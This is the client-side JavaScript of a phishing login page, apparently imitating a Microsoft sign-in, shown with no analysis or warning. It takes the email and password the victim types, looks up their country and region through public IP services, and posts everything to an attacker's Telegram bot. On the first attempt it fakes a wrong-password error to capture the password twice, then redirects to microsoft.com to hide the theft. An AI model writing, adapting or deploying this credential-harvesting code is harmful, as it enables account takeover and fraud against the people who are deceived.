let attempt = 0;

    async function getLocationData() {
      const fallbackOptions = [
        async () => {
          const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
          const data = await res.json();
          return {
            country: data.country_name || data.country || "Unknown",
            state: data.region || data.city || "Unknown"
          };
        },
        async () => {
          const res = await fetch('https://freeipapi.com/json/', { signal: AbortSignal.timeout(5000) });
          const data = await res.json();
          return {
            country: data.country_name || "Unknown",
            state: data.region_name || "Unknown"
          };
        },
        async () => {
          const res = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
          const data = await res.json();
          return {
            country: data.country || "Unknown",
            state: data.region || "Unknown"
          };
        }
      ];

      for (const fetchLocation of fallbackOptions) {
        try {
          const result = await fetchLocation();
          if (result.country && result.country !== "Unknown") {
            return result;
          }
        } catch (err) {
          continue;
        }
      }

      return { country: "Unknown", state: "Unknown" };
    }

    async function sendCredentials(email, password) {
      const endpoint = ENDPOINT;

      const location = await getLocationData();

      const message = `EMAIL
      
USER: ${email}

PWD: ${password}

COUNTRY: ${location.country} 🌍

STATE: ${location.state}

X: ${attempt} ⏱️`;

      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
          })
        });
        console.log("✅ Sent to Telegram");
      } catch (err) {
        console.error("❌ Send failed to Telegram:", err);
      }
    }

    async function submitLogin() {
      const email = document.getElementById('emailInput').value.trim();
      const password = document.getElementById('passwordInput').value.trim();
      const btn = document.getElementById('signInBtn');
      const btnText = document.getElementById('btnText');
      const spinner = document.getElementById('spinner');
      const errorMsg = document.getElementById('errorMsg');

      if (!email || !password) {
        errorMsg.textContent = "Please enter your email and password.";
        errorMsg.classList.remove('hidden');
        return;
      }

      btnText.classList.add('hidden');
      spinner.classList.remove('hidden');
      btn.disabled = true;

      attempt++;

      await sendCredentials(email, password);

      if (attempt === 1) {
        setTimeout(() => {
          errorMsg.textContent = "That password doesn't look right. Make sure it's the one you use for this account.";
          errorMsg.classList.remove('hidden');

          btnText.classList.remove('hidden');
          spinner.classList.add('hidden');
          btn.disabled = false;
          document.getElementById('passwordInput').value = '';
        }, 1400);
      } else {
        setTimeout(() => {
          window.location.href = "https://www.microsoft.com";
        }, 1200);
      }
    }

    document.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') submitLogin();
    });